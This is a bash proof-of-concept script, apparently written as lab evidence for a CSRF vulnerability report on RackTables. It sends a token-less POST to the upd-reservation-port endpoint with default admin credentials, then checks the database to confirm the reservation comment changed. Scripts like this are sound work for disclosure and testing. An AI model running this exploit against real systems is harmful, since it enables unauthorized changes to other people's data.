#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-http://127.0.0.1:8080}"
AUTH_USER="${AUTH_USER:-admin}"
AUTH_PASS="${AUTH_PASS:-admin}"
FIXTURE_ENV="${FIXTURE_ENV:-/opt/evidence/fixture.env}"

if [[ ! -f "$FIXTURE_ENV" ]]; then
  echo "[!] Missing fixture env: $FIXTURE_ENV"
  exit 1
fi
# shellcheck disable=SC1090
source "$FIXTURE_ENV"

NEW_TEXT="CSRF proof $(date +%s)"
POST_URL="${TARGET}/index.php?module=ajax&ac=upd-reservation-port"

printf '[*] Target: %s\n' "$TARGET"
printf '[*] Endpoint: %s\n' "$POST_URL"
printf '[*] Authenticated victim: %s via HTTP Basic Auth\n' "$AUTH_USER"
printf '[*] Fixture port_id: %s\n' "$PORT_ID"
printf '[*] New reservation comment: %s\n' "$NEW_TEXT"
printf '[*] Sending state-changing POST without any CSRF token...\n'

RESP="$(curl -fsS -u "${AUTH_USER}:${AUTH_PASS}" \
  -X POST \
  --data-urlencode "id=${PORT_ID}" \
  --data-urlencode "text=${NEW_TEXT}" \
  "$POST_URL")"

printf '[*] HTTP response:\n%s\n' "$RESP"

DB_USER="${RACKTABLES_DB_USER:-racktables}"
DB_PASS="${RACKTABLES_DB_PASS:-racktables}"
DB_NAME="${RACKTABLES_DB_NAME:-racktables_lab}"
DB_TEXT="$(mysql -N -B -u"${DB_USER}" -p"${DB_PASS}" "${DB_NAME}" -e "SELECT reservation_comment FROM Port WHERE id=${PORT_ID}")"
printf '[*] Database reservation_comment after POST:\n%s\n' "$DB_TEXT"

if [[ "$DB_TEXT" == "$NEW_TEXT" ]]; then
  printf '[+] CSRF condition reproduced: the state-changing AJAX operation accepted a request with no CSRF token.\n'
  printf '[+] A cross-site HTML form can submit the same parameters from an authenticated victim browser.\n'
else
  printf '[!] Reproduction failed: database value did not change as expected.\n'
  exit 1
fi
